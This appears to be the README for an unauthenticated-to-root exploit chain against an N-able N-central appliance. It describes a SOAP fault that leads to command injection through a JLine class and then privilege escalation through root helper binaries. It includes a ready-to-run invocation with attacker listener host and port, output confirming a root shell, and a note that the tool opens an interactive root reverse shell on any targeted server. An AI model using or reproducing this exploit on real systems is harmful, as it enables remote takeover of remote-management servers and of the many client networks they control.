# Able2Shell

This folder contains the anonymous-to-root exploit chain verified against N-able N-central Appliance 2026.4.1.26 HF2 (`2026.4.1.26-b2026_4_1_26`). Just point it at an N-able server and it should one shot it.

Legacy API needs to be enabled; Forgot this was turned on during earlier testing for other vulnerabilities.

### Anonymous Axis SOAP Fault to root RCE

The public Axis endpoint constructs the shipped JLine terminal-settings class from attacker SOAP fault data before validating its type. JLine injects that value into `sh -c` as `nable`; the inline stage then uses the self-restoring `setLDFileOwner` and `serverControl` helper chain to execute as root.

```console
sh$ python3 anonymous_axis_root_rce.py --target https://n-central.local/dms/services/ServerUI --lhost 192.168.1.145 --lport 19187 --command /usr/bin/id
http=500
write_before=false
write_after=true
helper_restored=true
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
```

[PoC](anonymous_axis_root_rce.py) · [Output](anonymous_axis_root_rce.output.txt) · [Screenshot](anonymous_axis_root_rce.png)

Omit `--command` for an interactive root reverse shell. The PoC refuses to replace a pre-existing fixed flag path and removes its temporary backup, trampoline, result, and flag before the root effect runs.
